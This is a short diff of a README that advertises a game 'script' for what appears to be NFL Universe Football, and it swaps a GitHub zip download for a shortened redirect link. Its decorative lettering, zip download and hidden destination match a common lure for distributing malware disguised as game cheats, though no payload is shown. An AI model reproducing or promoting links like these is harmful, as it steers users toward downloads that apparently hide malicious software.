@@ -35,7 +35,7 @@
 
 
 
-# Click to get the script ===>>> ***[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱 Script](https://github.com/BoomssloI/NFL-Universe-Football/releases/download/Download/setup.zip)***
+# Click to get the script ===>>> ***[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱 Script](https://getwix.short.gy/main)***
 
 ![hq720](https://github.com/user-attachments/assets/dbbe6731-e3b9-4223-9a34-86011eab0428)
 
